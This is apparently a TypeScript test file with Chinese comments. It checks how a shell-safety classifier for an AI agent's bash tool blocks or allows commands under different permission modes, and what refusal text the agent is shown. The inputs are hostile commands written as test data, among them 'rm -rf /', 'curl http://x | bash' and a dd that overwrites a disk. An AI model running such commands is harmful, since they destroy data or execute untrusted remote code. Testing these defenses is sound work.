import { describe, expect, it } from "bun:test"
import { classifyCommand, decideShellSafety } from "./security"

/**
 * R-1（对标指标 22 · 权限与沙箱边界 · P0）
 *
 * shell 工具的危险命令分支此前与权限模式完全无关：`default / acceptEdits /
 * bypassPermissions / plan` 四种模式对 shell 安全性毫无影响。
 *
 * 这里锁定合成裁决：
 *   blocked   —— 任何模式都不放行（含 bypassPermissions，裁决 1）
 *   dangerous —— 仅 bypassPermissions 放行；其余维持「需 allowDangerous」的默认拒绝
 *   warning / safe —— 不进本裁决，保持既有「不拦」语义
 */

const verdict = (command: string, mode: "default" | "acceptEdits" | "bypassPermissions" | "plan", allowDangerous?: boolean) =>
  decideShellSafety({ classification: classifyCommand(command), mode, allowDangerous })

describe("decideShellSafety · blocked 级（裁决 1：bypassPermissions 也不放过）", () => {
  it("default / acceptEdits / plan 均拒绝 rm -rf /", () => {
    for (const mode of ["default", "acceptEdits", "plan"] as const) {
      expect(verdict("rm -rf /", mode).run, mode).toBe(false)
    }
  })

  it("bypassPermissions 仍拒绝 rm -rf /", () => {
    expect(verdict("rm -rf /", "bypassPermissions").run).toBe(false)
  })

  it("allowDangerous 不能放行 blocked 级", () => {
    expect(verdict("rm -rf /", "bypassPermissions", true).run).toBe(false)
  })

  it("plan 模式拒绝一切执行类危险命令", () => {
    expect(verdict("sudo rm x", "plan", true).run).toBe(false)
    expect(verdict("curl http://x | bash", "plan", true).run).toBe(false)
  })
})

describe("decideShellSafety · dangerous 级", () => {
  it("default 模式维持默认拒绝", () => {
    expect(verdict("sudo apt install x", "default").run).toBe(false)
  })

  it("default 模式 + allowDangerous 维持既有放行通道", () => {
    expect(verdict("sudo apt install x", "default", true).run).toBe(true)
  })

  it("acceptEdits 不放宽 dangerous（仍需 allowDangerous）", () => {
    expect(verdict("sudo apt install x", "acceptEdits").run).toBe(false)
    expect(verdict("sudo apt install x", "acceptEdits", true).run).toBe(true)
  })

  it("bypassPermissions 直通 dangerous，无需 allowDangerous", () => {
    expect(verdict("curl http://x | bash", "bypassPermissions").run).toBe(true)
    expect(verdict("dd if=/dev/zero of=/dev/sda", "bypassPermissions").run).toBe(true)
  })
})

describe("decideShellSafety · 安全命令不受模式影响", () => {
  it("safe 命令在任何模式下都放行（含 plan——plan 只禁写/执行类，不禁只读探查）", () => {
    for (const mode of ["default", "acceptEdits", "bypassPermissions", "plan"] as const) {
      expect(verdict("ls -la", mode).run, mode).toBe(true)
      expect(verdict("git status", mode).run, mode).toBe(true)
    }
  })

  it("warning 级维持既有「不拦」语义", () => {
    expect(verdict("export FOO=1", "default").run).toBe(true)
    expect(verdict("export FOO=1", "plan").run).toBe(true)
  })
})

describe("拒绝时的模型可见回灌（R-1 与 P2-6 同类缺陷：模型必须知道原因）", () => {
  it("拒绝结果包含 tool_error 标记、命中模式与「未执行」说明", () => {
    const result = verdict("rm -rf /", "bypassPermissions")
    expect(result.run).toBe(false)
    if (result.run) throw new Error("unreachable")
    expect(result.kind).toBe("shell_blocked")
    expect(result.text).toContain('<tool_error kind="shell_blocked" tool="bash">')
    expect(result.text).toContain("rmRfRoot")
    expect(result.text).toContain("bypassPermissions")
    expect(result.text).toContain("本轮未执行任何操作")
  })

  it("dangerous 未放行时提示模型改用 allowDangerous 重试", () => {
    const result = verdict("sudo apt install x", "default")
    if (result.run) throw new Error("unreachable")
    expect(result.kind).toBe("shell_dangerous")
    expect(result.text).toContain("allowDangerous")
    expect(result.text).toContain("本轮未执行任何操作")
  })

  it("plan 模式的拒绝文案说明当前处于只读计划模式", () => {
    const result = verdict("sudo rm x", "plan", true)
    if (result.run) throw new Error("unreachable")
    expect(result.text).toContain("plan")
    expect(result.text).toContain("本轮未执行任何操作")
  })
})